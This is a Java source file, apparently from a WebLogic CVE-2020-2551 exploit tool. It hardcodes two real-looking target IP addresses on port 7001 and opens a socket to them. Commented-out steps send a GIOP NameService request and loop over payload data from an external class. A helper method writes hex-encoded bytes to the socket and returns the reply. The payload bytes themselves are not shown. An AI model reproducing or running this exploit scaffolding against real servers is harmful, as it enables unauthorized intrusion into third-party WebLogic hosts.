package CVE20202551;

import cn.hutool.core.util.HexUtil;
import org.jsoup.select.Evaluator;
import util.HexStringUtil;
import util.WeblogicVersion;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Arrays;

/**
 * @ClassName: echo
 * @Description: TODO
 * @Author: Summer
 * @Date: 2020/11/24 13:56
 * @Version: v1.0.0
 * @Description:
 **/
public class echo {
//     150.136.33.169
//    http://177.22.192.18:7001/
//    static String IP = "150.136.33.169"; //ip
    static String IP = "177.22.192.18";
    static int PORT = 7001; // 端口
    static String Version = null; //Weblogic 版本号

    public static void main(String[] args) {

//        String url = "http://" + IP + ":" + PORT ;
//        Version = WeblogicVersion.getVersion(IP, PORT);
//        if ( Version != null ) {
//            System.out.println("Weblogic Version is :" + Version);
//        }else {
//            System.out.println("Weblogic 版本号获取不明！");
//        }




        Socket socket = null;
        try {
            socket = new Socket(IP, PORT);

        } catch (IOException e) {
            e.printStackTrace();
        }
//        // 第一步
//        // Name Server请求
//        String NameServer = "47494f50010200030000001700000002000000000000000b4e616d6553657276696365";
//
//        try {
//            // 发送请求
//            byte[] nameserver = sendSocket(NameServer, socket);
//            System.out.println("namesever --> " + HexUtil.decodeHexStr(HexStringUtil.binaryToHexString(nameserver)));
//        } catch (Exception e) {
//            //异常处理
//            System.out.println("nameserver is error!");
//            e.printStackTrace();
//        }
        // 第二步 循环遍历数组

//        int i = 0;
//        String[] datas = new Payload1Data().getDatas();
//        for (String data:datas){
//            i = i + 1;
//            System.out.println("第" + i + "次发送数据-->  ");
//            try {
//                byte[] echodata = sendSocket(data, socket);
//                System.out.println(HexUtil.decodeHexStr(HexStringUtil.binaryToHexString(echodata)));
//            } catch (Exception e) {
//                System.out.println("第" + i + "次数据异常！");
//                e.printStackTrace();
//            }
//        }





    }
    /**
     * @Description:
     * @param sendMessage 发送信息hexString字符串
     * @param socket    socket 连接
     * @return: 返回读取到的内容
     */
    public static byte[] sendSocket(String sendMessage, Socket socket) throws Exception {
        OutputStream out = socket.getOutputStream();
        InputStream is = socket.getInputStream();
        out.write(HexStringUtil.hexStrToBinaryStr(sendMessage));
        out.flush();
        byte[] bytes = new byte[10240];
        int length = is.read(bytes);
        return Arrays.copyOfRange(bytes, 0,length);
    }
}
